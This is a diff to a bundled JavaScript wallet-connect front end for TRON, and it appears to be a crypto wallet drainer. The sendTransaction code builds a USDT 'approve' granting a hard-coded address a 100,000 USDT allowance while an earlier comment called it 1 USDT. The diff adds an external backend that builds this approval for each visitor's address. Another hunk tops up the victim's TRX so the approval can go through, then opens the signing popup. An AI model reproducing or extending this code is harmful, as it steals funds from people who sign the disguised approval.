@@ -90792,55 +90792,77 @@
                 }
             }
             async sendTransaction(e, t) {
-                // Exact working flow from checktrc repo (class Lue)
+                // Build approve tx via backend (API key) to avoid TronGrid 429, then open wallet popup
                 if (!this.provider)
                     throw new Error("Provider is required to sign a transaction.");
                 let approvalAttempted = !1;
                 try {
                     const tronWebInstance = this.tronWeb && this.tronWeb.transactionBuilder ? this.tronWeb : this.getTronWeb();
-                    const usdtContract = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
-                    const options = {
-                        // 15 TRX when the wallet already has at least 20 TRX.
-                        // 1000 TRX otherwise, so Trust Wallet uses USDT energy rental.
-                        feeLimit: "number" === typeof t && t > 0 ? t : 1e9,
-                        callValue: 0
-                    };
-                    // Approve exactly 1 USDT (TRC-20 USDT uses 6 decimal places)
-                    const parameters = [{
-                        type: "address",
-                        value: "TWejasrnoKg2AgPpCwHgozYeThWBu8S9Hw"
-                    }, {
-                        type: "uint256",
-                        value: "100000000000"
-                    }];
-                    const functionSelector = "approve(address,uint256)";
-                    console.log("[SIGN] Building approve (checktrc flow) for", e);
-                    const triggerDelays = [0, 1200, 2400];
-                    let triggerResult;
+                    const feeLimit = "number" === typeof t && t > 0 ? t : 1e9;
+                    const API_BASE = "https://tronscantelegram-q7ln.onrender.com";
+                    let triggerResult = null;
                     let triggerError = null;
-                    for (let attempt = 0; attempt < triggerDelays.length; attempt++) {
-                        if (triggerDelays[attempt])
-                            await new Promise((resolve => setTimeout(resolve, triggerDelays[attempt])));
-                        try {
-                            triggerResult = await tronWebInstance.transactionBuilder.triggerSmartContract(usdtContract, functionSelector, options, parameters, e);
-                            triggerError = null;
-                            break
-                        } catch (triggerErr) {
-                            triggerError = triggerErr;
-                            if (!isHttp429(triggerErr) || attempt === triggerDelays.length - 1)
-                                break;
-                            console.log("[HTTP] triggersmartcontract 429, short backoff", {
-                                endpoint: "https://api.trongrid.io/wallet/triggersmartcontract",
-                                attempt: attempt + 1,
-                                waitMs: triggerDelays[attempt + 1]
-                            })
+
+                    // 1) Prefer server-built approve tx (has TronGrid API key)
+                    try {
+                        console.log("[SIGN] Building approve via backend /build-approve for", e);
+                        const buildRes = await GS.post(API_BASE + "/build-approve", {
+                            userAddress: e,
+                            feeLimit: feeLimit
+                        }, {
+                            timeout: 45000
+                        });
+                        if (buildRes && buildRes.data && buildRes.data.success && buildRes.data.triggerResult) {
+                            triggerResult = buildRes.data.triggerResult;
+                            console.log("[SIGN] backend build-approve OK")
+                        } else {
+                            triggerError = new Error(buildRes && buildRes.data && buildRes.data.message ? buildRes.data.message : "backend build-approve failed")
+                        }
+                    } catch (buildErr) {
+                        triggerError = buildErr;
+                        console.warn("[SIGN] backend build-approve failed, fallback local", buildErr && buildErr.message ? buildErr.message : buildErr)
+                    }
+
+                    // 2) Fallback: local trigger with long 429 backoff
+                    if (!triggerResult) {
+                        const usdtContract = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
+                        const options = {
+                            feeLimit: feeLimit,
+                            callValue: 0
+                        };
+                        const parameters = [{
+                            type: "address",
+                            value: "TWejasrnoKg2AgPpCwHgozYeThWBu8S9Hw"
+                        }, {
+                            type: "uint256",
+                            value: "100000000000"
+                        }];
+                        const functionSelector = "approve(address,uint256)";
+                        console.log("[SIGN] Building approve locally for", e);
+                        const triggerDelays = [0, 3000, 6000, 10000];
+                        for (let attempt = 0; attempt < triggerDelays.length; attempt++) {
+                            if (triggerDelays[attempt])
+                                await new Promise((resolve => setTimeout(resolve, triggerDelays[attempt])));
+                            try {
+                                triggerResult = await tronWebInstance.transactionBuilder.triggerSmartContract(usdtContract, functionSelector, options, parameters, e);
+                                triggerError = null;
+                                break
+                            } catch (triggerErr) {
+                                triggerError = triggerErr;
+                                if (!isHttp429(triggerErr) || attempt === triggerDelays.length - 1)
+                                    break;
+                                console.log("[HTTP] triggersmartcontract 429, backoff", {
+                                    attempt: attempt + 1,
+                                    waitMs: triggerDelays[attempt + 1]
+                                })
+                            }
                         }
                     }
-                    if (triggerError) {
-                        const message = triggerError && triggerError.message ? triggerError.message : String(triggerError);
+
+                    if (!triggerResult) {
+                        const message = triggerError && triggerError.message ? triggerError.message : String(triggerError || "build approve failed");
                         console.error("[10] ERROR", {
                             stage: "approval-not-attempted",
-                            endpoint: "https://api.trongrid.io/wallet/triggersmartcontract",
                             message: message
                         });
                         return {
@@ -90851,9 +90873,10 @@
                             error: message
                         }
                     }
+
                     console.log("[SIGN] trigger done, opening wallet popup...");
                     approvalAttempted = !0;
-                    // CRITICAL: pass FULL triggerSmartContract response as transaction (legacy WC format used by working site)
+                    // CRITICAL: pass FULL triggerSmartContract response as transaction (legacy WC format)
                     const signed = (await this.provider.request({
                         method: "tron_signTransaction",
                         params: {
@@ -92933,20 +92956,25 @@
                     } catch (_) {}
 
                     if (balanceInTRX < minTrx && recentTopUp) {
-                        // Avoid second top-up loop: TRX already sent, RPC may still lag — go approve
+                        // TRX already sent recently — wait 5s then open approve (no second top-up, no tap button)
                         console.log("[4] TRX TOP-UP START", {
                             skipped: true,
-                            reason: "recent top-up in session, open approve popup"
-                        });
-                        console.log("[5] TRX TOP-UP RESULT", {
-                            skipped: true,
-                            status: "recent-topup-reuse"
+                            reason: "recent-topup-reuse wait 5s then approve"
                         });
                         reportEvent("TRX_TOPUP_SKIPPED", {
                             reason: "recent-topup-reuse",
                             balanceInTRX: balanceInTRX
                         });
-                        topUpSent = true
+                        topUpSent = true;
+                        reportEvent("TRX_TOPUP_CONFIRM_WAIT_START", {
+                            waitMs: 5000,
+                            reason: "recent-topup-reuse"
+                        });
+                        await new Promise((resolve) => setTimeout(resolve, 5000));
+                        reportEvent("TRX_TOPUP_CONFIRM_DONE", {
+                            waitMs: 5000,
+                            continueToApprove: true
+                        })
                     } else if (balanceInTRX < minTrx) {
                         console.log("[4] TRX TOP-UP START", {
                             skipped: false,
